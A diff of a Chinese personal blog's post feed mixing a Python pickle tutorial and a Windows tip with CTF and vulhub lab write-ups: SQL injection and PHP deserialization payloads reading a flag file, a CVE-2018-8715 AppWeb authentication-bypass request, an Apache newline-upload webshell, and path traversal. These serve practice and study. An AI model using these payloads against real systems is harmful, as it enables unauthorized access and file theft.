+<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="loads">loads</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
+<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>python</category>
       </categories>
       <tags>
-        <tag>Apache</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
-    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
-<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
-<ul>
-<li>basic 传统HTTP基础认证</li>
-<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
-<li>form 表单认证</li>
-</ul>
-<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
-</ul>
-<p>路径：</p>
-<ul>
-<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
-</ul>
-<p>启动环境：</p>
-<ul>
-<li><code>sudo docker-compose up -d</code></li>
-<li>输入 <code>http://ip:8080</code> 即可访问</li>
-</ul>
-<p>前提：</p>
-<ul>
-<li>已知某个用户名为 <code>admin</code></li>
-</ul>
-<h1 id="复现">复现</h1>
-<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
-<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
-<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
-<p>（最后两个空行很重要！）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
-<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
-<ul>
-<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
-</ul>
-<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
-<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>AppWeb</tag>
+        <tag>python</tag>
+        <tag>pickle</tag>
       </tags>
   </entry>
   <entry>
@@ -1059,101 +924,197 @@
       </tags>
   </entry>
   <entry>
-    <title>网鼎杯 2018 Fakebook</title>
-    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+    <title>windows 上CD驱动器的删除问题</title>
+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
 <span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
-<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
-<h1 id="第一次sql注入">第一次sql注入</h1>
-<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
-<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
-<h2 id="获取字段数">获取字段数</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
-<h2 id="测试显示位">测试显示位</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
-<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
-<p>上面的信息很丰富：</p>
-<ul>
-<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
-<li>显示位为 2</li>
-<li>地址为：<strong>/var/www/html/view.php</strong></li>
-</ul>
-<h2 id="常规注入">常规注入</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
-<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
-<h1 id="信息收集">信息收集</h1>
-<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
-<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>（这里也说明，blog是有特殊的格式要求的。）</p>
-<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
-<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
-<h1 id="第二次sql注入">第二次sql注入</h1>
-<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
-<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
-<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
-<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
-<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
-<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
-<h1 id="其他注入方法">其他注入方法</h1>
-<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
-<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
+<h1 id="问题描述">问题描述</h1>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
-        <tag>反序列化</tag>
+        <tag>Windows小知识</tag>
       </tags>
   </entry>
   <entry>
-    <title>网鼎杯 2020 朱雀组 phpweb</title>
-    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
-    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
+    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
+<ul>
+<li><p>版本等于2.4.49</p></li>
+<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
+</ul>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
+<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
+<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
+<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
+</ul>
+<p>路径：</p>
+<ul>
+<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
+</ul>
+<p>运行漏洞环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>进入环境，显示如下则环境搭建成功。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
+<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
+<p>成功得到文件的内容，因此证明存在此漏洞。</p>
+<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
+<p>接下来改变请求的方式，发送如下请求：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
+<p>成功执行命令。</p>
+<h1 id="总结">总结</h1>
+<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
+<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
+<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
+<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
+<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
+<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
+<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
+<p>成功获得 webshell。</p>
+<h1 id="总结">总结</h1>
+<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
+<h1 id="资源">资源</h1>
+<ol type="1">
+<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
+    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
+<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
+<ul>
+<li>basic 传统HTTP基础认证</li>
+<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
+<li>form 表单认证</li>
+</ul>
+<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
+</ul>
+<p>路径：</p>
+<ul>
+<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
+</ul>
+<p>启动环境：</p>
+<ul>
+<li><code>sudo docker-compose up -d</code></li>
+<li>输入 <code>http://ip:8080</code> 即可访问</li>
+</ul>
+<p>前提：</p>
+<ul>
+<li>已知某个用户名为 <code>admin</code></li>
+</ul>
+<h1 id="复现">复现</h1>
+<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
+<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
+<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>（最后两个空行很重要！）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
+<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
+<ul>
+<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
+</ul>
+<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
+<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>AppWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯 2019 高明的黑客</title>
+    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
